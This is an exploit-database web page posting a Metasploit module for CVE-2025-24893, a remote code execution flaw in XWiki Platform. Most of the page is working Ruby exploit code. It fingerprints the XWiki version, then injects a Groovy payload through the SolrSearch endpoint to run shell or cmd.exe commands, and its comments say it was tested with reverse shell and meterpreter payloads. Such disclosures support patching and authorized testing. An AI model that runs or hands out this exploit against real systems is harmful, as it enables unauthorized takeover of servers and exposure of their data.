---
title: XWiki Platform 15.10.10 Metasploit Module for Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025120004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-09
fetch_date: 2025-12-10T03:19:49.879506
---

# XWiki Platform 15.10.10 Metasploit Module for Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **XWiki Platform 15.10.10 Metasploit Module for Remote Code Execution (RCE)** **2025.12.09**  Credit:  **[Maksim Rogov](https://cxsecurity.com/author/Maksim%2BRogov/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-24893](https://cxsecurity.com/cveshow/CVE-2025-24893/ "Click to see CVE-2025-24893")**  CWE: **N/A** | |

##
# Exploit Title: XWiki Platform 15.10.10 - Metasploit Module for Remote Code Execution (RCE)
# Date: 09/01/2025
# Exploit Author: Maksim Rogov
# Vendor Homepage: https://www.xwiki.org/
# Software Link: https://www.xwiki.org/xwiki/bin/view/Download/
# Version: (5.3‑milestone‑2 ≤ v < 15.10.11) ∨ (16.0.0‑rc‑1 ≤ v < 16.4.1)
# Tested on: Ubuntu 18.0.4 | Windows 10
# CVE : CVE-2025-24893
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank =3D ExcellentRanking
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info =3D {})
super(
update\_info(
info,
'Name' =3D> 'Remote Code Execution Vulnerability in XWiki Platform =
(CVE-2025-24893)',
'Description' =3D> %q{
This module exploits a template injection vulnerability in the th=
e XWiki Platform.
XWiki includes a macro called SolrSearch (defined in Main.SolrSea=
rchMacros) that enables full-text search through the embedded Solr engine.
The vulnerability stems from the way this macro evaluates search =
parameters in Groovy, failing to sanitize or restrict malicious input.
This vulnerability affects XWiki Platform versions >=3D 5.3-miles=
tone-2 and < 15.10.11, and versions >=3D 16.0.0-rc-1 and < 16.4.1.
Successful exploitation may result in the remote code execution u=
nder the privileges
of the web server, potentially exposing sensitive data or disrupt=
ing survey operations.
An attacker can execute arbitrary system commands in the context =
of the user running the web server.
},
'License' =3D> MSF\_LICENSE,
'Author' =3D> [
'Maksim Rogov', # Metasploit Module
'John Kwak' # Vulnerability Discovery
],
'References' =3D> [
['CVE', '2025-24893'],
['URL', 'https://github.com/xwiki/xwiki-platform/security/advisor=
ies/GHSA-rr6p-3pfg-562j']
],
'Platform' =3D> ['unix', 'linux', 'win'],
'Arch' =3D> [ARCH\_CMD],
'Targets' =3D> [
[
'Unix Command',
{
'Platform' =3D> ['unix', 'linux'],
'Arch' =3D> ARCH\_CMD,
'Type' =3D> :unix\_cmd,
'DefaultOptions' =3D> {
# On Debian 9 curl is not installed by default
'FETCH\_COMMAND' =3D> 'WGET'
}
# Tested with cmd/unix/reverse\_bash
# Tested with cmd/linux/http/x64/meterpreter/reverse\_tcp
}
],
[
'Windows Command',
{
'Platform' =3D> ['win'],
'Arch' =3D> ARCH\_CMD,
'Type' =3D> :win\_cmd
# Tested with cmd/windows/http/x64/meterpreter/reverse\_tcp
}
],
],
'Payload' =3D> {
'BadChars' =3D> '\\'
},
'DefaultTarget' =3D> 0,
'DisclosureDate' =3D> '2025-02-20',
'Notes' =3D> {
'Stability' =3D> [CRASH\_SAFE],
'SideEffects' =3D> [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK],
'Reliability' =3D> [REPEATABLE\_SESSION]
}
)
)
register\_options(
[
OptString.new('TARGETURI', [true, 'Path to XWiki', '/']),
]
)
end
def check
print\_status('Extracting version...')
res =3D send\_request\_cgi(
'uri' =3D> normalize\_uri(target\_uri.path, '/xwiki/bin/view/Main/'),
'method' =3D> 'GET'
)
return CheckCode::Unknown('No response from target') unless res&.code =
=3D=3D 200
version\_div =3D res.get\_html\_document.at('div[id=3D"xwikiplatformversio=
n"]')
return CheckCode::Safe('Possibly not XWiki or incorrect path (version t=
ag not found)') unless version\_div
version\_match =3D version\_div.text.match(/XWiki.\*?(\d+\.\d+\.\d+)/)
unless version\_match
print\_error("#{peer} - Unable to extract version number")
return CheckCode::Detected('XWiki detected, but version number missin=
g or unrecognized')
end
version =3D Rex::Version.new(Regexp.last\_match(1).to\_s)
print\_status("Extracted version: #{version}")
if version.between?(Rex::Version.new('5.3.0'), Rex::Version.new('15.10.=
10')) ||
version.between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.4.=
0'))
return CheckCode::Appears("Detected version #{version}, which is vuln=
erable")
end
return CheckCode::Safe("Version #{version} appears safe")
end
def build\_cmd
print\_status('Building command for target...')
if target['Type'] =3D=3D :unix\_cmd
cmd\_array =3D "'sh', '-c', '#{payload.encoded}'"
else
cmd\_array =3D "'cmd.exe', '/b', '/q', '/c', '#{payload.encoded}'"
end
print\_good('Command successfully built for target')
return "{{async async=3Dfalse}}{{groovy}}[#{cmd\_array}].execute().text{=
{/groovy}}{{/async}}"
end
def send\_payload(cmd)
print\_status('Uploading payload...')
vars\_get =3D {
'media' =3D> 'rss',
'text' =3D> cmd
}
send\_request\_cgi({
'uri' =3D> normalize\_uri(target\_uri.path, '/xwiki/bin/get/Main/SolrSe=
arch'),
'method' =3D> 'GET',
'vars\_get' =3D> vars\_get
})
end
def exploit
cmd =3D build\_cmd
send\_payload(cmd)
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top